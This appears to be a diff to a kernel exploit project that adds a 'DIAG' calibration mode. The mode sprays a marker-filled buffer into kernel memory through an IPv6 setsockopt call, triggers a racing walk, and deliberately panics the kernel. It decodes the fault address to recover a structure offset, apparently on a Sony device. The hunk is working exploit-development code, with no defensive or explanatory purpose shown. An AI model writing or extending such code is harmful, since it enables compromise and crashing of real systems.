@@ -38,6 +38,49 @@ namespace ghostlock::route {
             return status;
         }
         const size_t stamp_size = *layout.buffer_size;
+        /* v12.7: DIAG mode — waiter_off==65535 selects it (the validator
+         * only needs waiter_off+lock_offset+8 <= buffer_size, so the DIAG
+         * conf pairs it with buffer_size=65615). Fill the whole stamp with
+         * the upstream marker pattern: gsr[j] = 0xD00D000000000000 | (j*8).
+         * The walk then dereferences a marker as the ghost's lock and the
+         * panic fault address IS the marker — decode j = (far & 0xfff)/8,
+         * true waiter_off = j*8 - 7*8 (field7 lands at gsr word j). One
+         * panicked shot therefore calibrates the Sony shift exactly, the
+         * same way the upstream derived shift=21 from their m1 DIAG fire. */
+        if (*layout.waiter_offset == 65535) {
+            __extension__ unsigned char diag[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
+            memset(diag, 0, sizeof(diag));
+            size_t words = stamp_size / 8;
+            for (size_t j = 0; j < words; ++j) {
+                uint64_t marker = 0xD00D000000000000ULL | (static_cast<uint64_t>(j) * 8);
+                memcpy(diag + j * 8, &marker, sizeof(marker));
+            }
+            uint16_t family = AF_UNSPEC;
+            memcpy(diag + 8, &family, sizeof(family));
+            int32_t dfd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+            if (dfd < 0) {
+                status.step = 62;
+                status.error_number = errno;
+                status.code = ROUTE_FALLBACK_SAFE;
+                return status;
+            }
+            errno = 0;
+            (void) setsockopt(dfd, IPPROTO_IPV6, 44, diag, (socklen_t) sizeof(diag));
+            pr_info("mcast DIAG stamped %zu words errno=%d; awaiting consumer walk\n",
+                    words, errno);
+            session::g_exploit_session.race.consumer_go.store(1);
+            for (int32_t spin = 0; spin < 100000000 &&
+                                   session::g_exploit_session.race.consumer_calls.load() == 0;
+                 spin++)
+                __asm__ volatile ("yield" ::: "memory");
+            session::g_exploit_session.race.consumer_go.store(0);
+            close(dfd);
+            status.step = 0;
+            status.userspace_clean = 1;
+            status.kernel_disarmed = 1;
+            status.code = ROUTE_FALLBACK_SAFE;
+            return status;
+        }
         const size_t waiter_off = static_cast<size_t>(*layout.waiter_offset);
         /* VLA size comes from the validated profile geometry; the encode step
      * rejects an undersized buffer before any indexed write. */
